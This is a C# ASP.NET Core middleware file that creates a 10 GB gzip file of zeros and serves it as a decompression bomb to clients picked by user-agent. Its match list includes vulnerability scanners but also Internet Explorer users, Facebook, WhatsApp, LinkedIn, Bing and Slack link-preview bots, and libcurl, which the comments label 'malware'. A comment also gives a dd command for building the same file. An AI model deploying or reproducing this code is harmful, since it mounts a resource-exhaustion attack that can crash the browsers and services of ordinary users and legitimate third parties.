
namespace GzipBomb
{

    // https://blog.haschek.at/post/f2fda
    // https://dzimchuk.net/understanding-aspnet-5-middleware/
    // https://xeushack.com/zip-bomb/
    
    // dd if=/dev/zero bs = 1M count=10240 | gzip > 10G.gzip 
    public class GzipBombMiddleware
    {
        private const string fileName = "10G.gzip";
        private const int ONE_MEGABYTE = 1024 * 1024;
        private const int REPEAT_COUNT = 10240;


        public static void CreateHugeGzipFile()
        {
            if (System.IO.File.Exists(fileName))
                return;

            byte[] buffer = new byte[ONE_MEGABYTE]; // 1MB

            using (System.IO.FileStream gzipTargetAsStream = System.IO.File.OpenWrite(fileName))
            {
                using (ICSharpCode.SharpZipLib.GZip.GZipOutputStream gzipStream =
                    new ICSharpCode.SharpZipLib.GZip.GZipOutputStream(gzipTargetAsStream))
                {
                    try
                    {

                        for (int i = 0; i < REPEAT_COUNT; ++i)
                        {
                            gzipStream.Write(buffer, 0, ONE_MEGABYTE);
                        } // Next i 

                    }
                    catch (System.Exception ex)
                    {
                        System.Console.WriteLine(ex.Message);
                    }
                } // End Using gzipStream 

            } // End Using gzipTargetAsStream 

        } // End Sub CreateHugeGzipFile


        private static void CreateHugeBullshitGzipFile()
        {
            if (System.IO.File.Exists(fileName))
                return;

            byte[] buffer = new byte[ONE_MEGABYTE]; // 1MB
            
            using (System.IO.FileStream gzipTargetAsStream = System.IO.File.OpenWrite(fileName))
            {
                using (System.IO.Compression.GZipStream gzipStream =
                    new System.IO.Compression.GZipStream(gzipTargetAsStream, System.IO.Compression.CompressionLevel.Optimal))
                {
                    try
                    {

                        for (int i = 0; i < REPEAT_COUNT; ++i)
                        {
                            gzipStream.Write(buffer, 0, ONE_MEGABYTE);
                            gzipStream.Flush();
                            gzipTargetAsStream.Flush();
                        } // Next i 

                    }
                    catch (System.Exception ex)
                    {
                        System.Console.WriteLine(ex.Message);
                    }
                } // End Using GZipStream 

            } // End Using gzipTargetAsStream 

        } // End Sub CreateHugeBullshitGzipFile 




        private readonly Microsoft.AspNetCore.Http.RequestDelegate m_next;


        public GzipBombMiddleware(Microsoft.AspNetCore.Http.RequestDelegate next)
        {
            this.m_next = next;
        } // End Constructor 


        public async System.Threading.Tasks.Task Invoke(Microsoft.AspNetCore.Http.HttpContext context)
        {
            try
            {
                // do your stuff here before calling the next middleware in the pipeline
                System.IO.FileInfo fi = new System.IO.FileInfo(fileName);

                // https://github.com/monperrus/crawler-user-agents/blob/master/crawler-user-agents.json
                if (context.Request.Headers.ContainsKey("USER-AGENT"))
                {
                    string ua = (string)context.Request.Headers["USER-AGENT"] ?? "";
                    ua = ua.ToLowerInvariant();

                    if (ua != null &&
                        ua.IndexOf("trident/") != -1 // FU IE 8-11 - MALWARE 
                        || ua.IndexOf("msie") != -1// FU IE 5-7 - MALWARE 
                        // || ua.ToLowerInvariant().IndexOf("edge/") != -1 // MALWARE 
                        || ua.IndexOf("sqlmap/") != -1 // vulnerability scanner 
                        || ua.IndexOf("masscan/") != -1 // vulnerability scanner 
                        || ua.IndexOf("nikto/") != -1 // vulnerability scanner 
                        || ua.IndexOf("java/") != -1 // vulnerability scanner 
                        || ua.IndexOf("httpclient/") != -1 // vulnerability scanner 
                        || ua.IndexOf("libfetch/") != -1 // vulnerability scanner 
                        || ua.IndexOf("libweb/") != -1 // vulnerability scanner 
                        || ua.IndexOf("go-http-client/") != -1 // vulnerability scanner 
                        || ua.IndexOf("pcore-http/") != -1 // vulnerability scanner 

                        || ua.IndexOf("nessus") != -1 // vulnerability scanner 
                        || ua.IndexOf("jorgee") != -1 // vulnerability scanner 
                        || ua.IndexOf("zmeu") != -1 // vulnerability scanner 
                        || ua.IndexOf("morfeus") != -1 // vulnerability scanner 
                        || ua.IndexOf("black.hole") != -1 // vulnerability scanner 
                        || ua.IndexOf("blackwidow") != -1 // vulnerability scanner 
                        || ua.IndexOf("bloodhound") != -1 // vulnerability scanner 
                        || ua.IndexOf("bumblebee") != -1 // vulnerability scanner 
                        || ua.IndexOf("claw") != -1 // vulnerability scanner 
                        || ua.IndexOf("grabnet") != -1 // vulnerability scanner 
                        || ua.IndexOf("grub") != -1 // vulnerability scanner 
                        || ua.IndexOf("internet.ninja") != -1 // vulnerability scanner 
                        || ua.IndexOf("yeti") != -1 // vulnerability scanner 
                        || ua.IndexOf("zeus") != -1 // vulnerability scanner 
                        || ua.IndexOf("wwwster") != -1 // vulnerability scanner 

                        || ua.IndexOf("libcurl") != -1 // vulnerability scanner 
                        || ua.IndexOf("libwww-perl") != -1 // vulnerability scanner 
                        || ua.IndexOf("purebot") != -1 // vulnerability scanner 
                        || ua.IndexOf("lipperhey") != -1 // vulnerability scanner 
                        || ua.IndexOf("mama casper") != -1 // vulnerability scanner 
                        || ua.IndexOf("gold crawler") != -1 // vulnerability scanner 

                        || ua.IndexOf("facebook") != -1 // privacy malware
                        || ua.IndexOf("linkedin.com") != -1 // privacy malware
                        || ua.IndexOf("bing.com") != -1 // privacy malware
                        || ua.IndexOf("msn.com") != -1 // privacy malware
                        || ua.IndexOf("msnbot") != -1 // privacy malware
                        || ua.IndexOf("whatsapp") != -1 // privacy malware
                        || ua.IndexOf("metadata scaper") != -1 // privacy malware
                        || ua.IndexOf("skypeuripreview") != -1 // bandwidth malware
                        || ua.IndexOf("httrack") != -1 // bandwidth malware
                        || ua.IndexOf("mail.ru") != -1 // bandwidth malware
                        || ua.IndexOf("bingpreview/") != -1 // bandwidth malware
                        || ua.IndexOf("bing/") != -1 // bandwidth malware
                        || ua.IndexOf("bingbot/") != -1 // bandwidth malware
                        || ua.IndexOf("baiduspider/") != -1 // bandwidth malware
                        || ua.IndexOf("baidu-yunguance") != -1 // bandwidth malware
                        || ua.IndexOf("slack-imgproxy") != -1 // bandwidth malware

                        || ua.IndexOf("domaincrawler") != -1 // domain-malware
                        || ua.IndexOf("domain re-animator bot") != -1 // domain-malware
                        
                        || ua.IndexOf("jugendschutzprogramm-crawler") != -1 // censorship malware

                        || ua.StartsWith("wp-") // wordpress vulnerability scanner 
                        || ua.StartsWith("wp/") // wordpress vulnerability scanner 
                        || ua.StartsWith("wordpress") // wordpress vulnerability scanner 

                        // || ua.ToLowerInvariant().IndexOf("firefox/") != -1 // MALWARE 

                        )
                    {
                        // context.Response.StatusCode = 200; // Success 
                        // context.Response.StatusCode = 418; // I'm a teapot
                        context.Response.StatusCode = 426; // Upgrade Required
                        // context.Response.StatusCode = 451; // Unavailable For Legal Reasons (RFC 7725)

                        context.Response.Headers["Content-Encoding"] = "gzip";
                        context.Response.Headers["Content-Length"] = fi.Length.ToString(System.Globalization.CultureInfo.InvariantCulture);

                        byte[] buffer = new byte[32768];

                        using (System.IO.Stream inputStream = System.IO.File.OpenRead(fileName))
                        {
                            int read;
                            while ((read = await inputStream.ReadAsync(buffer, 0, buffer.Length)) > 0)
                            {
                                await context.Response.Body.WriteAsync(buffer, 0, read);
                            } // Whend 

                        } // End Using inputStream 

                    } // End if (ua != null && ua.ToLowerInvariant().IndexOf("trident") != -1) 

                } // End if (context.Request.Headers.ContainsKey("USER-AGENT")) 

                await m_next(context);
                // do some more stuff here as the call is unwinding
            }
            catch (System.Exception ex)
            {
                context.Response.StatusCode = 500;
                // context.Response.Headers["WWW-Authenticate"] = "Basic";
            }

        } // End Task Invoke 


    } // End Class GzipBombMiddleware 


} // End Namespace GzipBomb 
